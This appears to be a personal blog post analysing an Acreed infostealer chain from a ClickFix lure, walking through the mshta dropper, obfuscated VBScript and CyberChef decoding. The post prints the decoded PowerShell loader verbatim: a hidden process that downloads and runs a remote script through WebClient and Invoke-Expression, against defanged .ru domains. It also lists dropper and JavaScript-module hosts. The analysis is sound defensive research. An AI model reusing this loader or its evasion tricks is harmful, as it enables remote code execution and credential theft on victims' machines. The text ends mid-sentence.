---
layout: post
title:  "Acreed InfoStealer - Malware Analysis"
date:   2025-09-16 21:00:00 +1000
categories: malware analysis
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Overview

Here we will be analysisng an Acreed Infostealer execution chain from a Clickfix payload.

I thought LummaStealer was difficult. This one is ridicolous.

### Dropper 

``mshta hXXps://gb[.]kaq51[.]ru/m54tdry4``

Okay, when safely pulled with my jank script we get about 2.5mbs of bits and bytes. 

![alt text](/images/mal_first.PNG)
- First can a command to move open mshta cmd window to (-99,0) on the screen, which is the bottom left. Likely to avoid suspicion?
- Next we can see an ``ELF`` file header and a Linux OS? Perhaps this is an embedded linux file. I can try to rebuild it cause we have the bytes!
- Last we have a script open up with some obfuscated VB code? What a throwback.

What's really interesting is the file opens ``script`` encapsulates the .elf file in it then closes ``script``. Really cool.

I tried to rebuild the .elf file in a Linux VM but cannot get it right, probably a character or a space off the right bits and bytes. I'll leave it. I reckon further down the line the code will call it and give the opportunity for us to dump it successfully.

![alt text](/images/vbs.PNG)

Looks like we have some hex strings here, I'm seeing this throughout the code, so I'll go through and convert every hex string I spot.

![alt text](/images/unobfuscted_first.PNG)

Now we can see a bit better, here what this function does.
1. Parses in the variable ``thkiaqvpzab``
2. Declares variables
3. Creates a WMI object
4. Connects to WMI service on machine
5. Gets the ProcessStartup class. This allows for process creation and management using WMI.
6. Sets the configuration of the WMI service to the variable ``nrhfhprneb`` with three flags. Configuration of WMI Object (``aihoizxpjk``), window size (``aihoizxpjk``) and an unknown variable of that passed in variable ``thkiaqvpzab``

Essentially the function uses WMI to spawn a hidden process. And, we are after what is passed to the function ``nrhfhprneb`` because that is likely a command/script.

![alt text](/images/second_part.PNG)

Now this pieces together the puzzle, this function creates the new process with the startup settings passed in from our previous function. 

![alt text](/images/next.PNG)

This stinks of our payload. Looks like Hex --> B64 --> Plaintext?

![alt text](/images/cyberchef_first.PNG)

Bingo. But that last part still looks like B64.

This hex string pattern occurs for about 60 more lines. So I'll Ctrl+H in Notepad++ and replace all instances of `eanjxdqwjegyor` and `ftekumdnoycycubr` with a null value, along with the brackets, equals and quotations.

![alt text](/images/payload_hex.PNG)

Cool now I'll whack this into CyberChef and see what we get. Decoding with Hex --> B64

![alt text](/images/hex_b64.PNG)

And then with the B64 left over. I'll copy/paste to a new input tab and decode that with B64

![alt text](/images/b64_decode.PNG)

Alright this still looks obfuscated. Let me copy/paste to notepad++ and see what I'm dealing with

![alt text](/images/weird_string.PNG)
![alt text](/images/encoded.PNG)

Looks like inline encoding. What we have is a big old string. And the decoding function at the end of the string. Looks complicated. But we have it there in our faces. So time to whip out CyberChef again, I'm baking a payload. 

In order we need to:
1. Replace all ! with 4s
2. Replace all > with 5s

![alt text](/images/baking.PNG)

Now that looks like hex to me. Lets decode from hex.

![alt text](/images/b64_still.PNG)

Now that looks like b64. Cmon surely this is it!

![alt text](/images/woohoo.PNG)

Bingo. How fun is decoding stuff.

``$È=New-Object System.Diagnostics.ProcessStartInfo;$È.FileName=($env:WINDIR+([char]92)+'SysWOW64'+[char]92+'WindowsPowerShell'+[char]92+'v1.0'+[char]92+'powershell.exe');$sub=-join(97..122|random -c(random -mi 3 -ma 6)|%{[char]$_});$È.Arguments='-Exec Unrestricted -Wind Hid -Comm "SV U ([Net.WebClient]::New());Set-Item Variable:/URM ''hXXp://'+$sub+'[.]ci6ef[.]ru/sinkers'';(LS Variable:U).Value.(((([Net.WebClient]::New()|Member)|Where{(GV _ -Valu).Name-ilike''*wn*d*g''}).Name))((Get-Variable URM).Value)|&(GCI Alias:\*EX)"';$È.UseShellExecute=$false;$È.CreateNoWindow=$true;$È.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden;[System.Diagnostics.Process]::Start($È)``

So what we can see is it using ``WebClient.DownloadString`` to download something at the domain ``hXXp://'+$sub+'[.]ci6ef[.]ru/sinkers`` and run it using ``Invoke-Expression``

Wow, how cool is $sub. So the PowerShell randomly generates a string for the $sub variable that is then passed into the domain ``hXXp://'+$sub+'[.]ci6ef[.]ru/sinkers``

``$sub=-join(97..122|random -c(random -mi 3 -ma 6)|%{[char]$_})``
- Anything between 3 and 6 characters in size is accepted
- Between 97..122 in ASCII (so a-z)

So back to my jank script to pull down the loader, I'll try ``hXXp://abc[.]ci6ef[.]ru/sinkers``. 

![alt text](/images/pull.PNG)
![alt text](/images/down.PNG)

Well it looks down. Getting 404s and no nslookup entry.

I'll repull a fresh sample of the dropper, and hopefully it has a new domain in there.

### Loader

Hell yea, mission success.

![alt text](/images/size.PNG)
![alt text](/images/size2.PNG)

This file is huge, I feel like I'm being trolled (clearly). I have no idea how I'm going to go through this. First though is AI but no model is accepting this input. Perhaps I can run a pattern matching algorithm over it? ML or something to flag anomalies. My static analysis journey is now under serious question.


### BackToTheDropper

![alt text](/images/decoded.PNG)

We have a powershell call and about 400 characters of more B64.

![alt text](/images/decoded_b64.PNG)

When I decode that B64 we can see a bit better, but still not great. All the data lives in the variable ``JzkRs``. 

I have no idea what those bits and bytes are. 

Zooming out I can see the value of all these encoded bits and bytes are passed to the variable ``rbeqwxctrp`` which is called later on in the script. So I will park this here for now. I reckon we will be able to dump it easier later.

![alt text](/images/error.PNG)

Looks some type of error handling script. I will say this now, this obfuscation is unique. However, the naming convention of the functions is identical to the last LummaStealer sample I manually analysed, so my money is on Lumma!

![alt text](/images/next_variable.PNG)

The function ``ozybymuzpian`` calls the function ``rbeqwxctrp`` which was used to store all the bits and bytes from the encoded hex --> b64 strings we observed above.

Then sets a value for the variable ``nfaupnpmtf`` to the output of the function ``pfikjr`` with a passed in parameter of ``poahoksthybhusnasu``. We have yet to have a look at the function ``pfikjr`` but will soon. This is getting good.

Now this is interesting. AutoOpen() is a macro used for Word/Excel. So perhaps, the malware opens an embedded word/excel document with a macro in it? AutoOpen() calls in ``ozybymuzpian``

![alt text](/images/third_function.PNG)

I'm not sure about this function. Really got no idea. May circle back.

![alt text](/images/fourth_function.PNG)


### JavaScript Modules

Acreed fetches malicious .JS scripts to run in the browser from two domains.
- trustdomainnet[.]live
- trusteddomain[.]win

It then runs these